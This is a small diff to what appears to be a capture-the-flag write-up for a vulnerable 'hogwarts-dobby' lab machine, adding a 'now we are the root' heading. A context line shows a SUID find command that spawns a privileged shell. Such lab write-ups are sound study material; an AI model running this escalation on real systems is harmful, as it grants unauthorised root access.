@@ -158,6 +158,8 @@ Command: /usr/bin/find . -exec /bin/sh -p \; -quit
 
 ![Desktop View]({{ "/assets/img/vuln-hogwarts-dobby/3.png" | relative_url }})
 
+### And now we are the root
+
 ![Desktop View]({{ "/assets/img/vuln-hogwarts-dobby/1.gif" | relative_url }})
 
 “If you have any questions or comments, please do not hesitate to write. Have a good days”
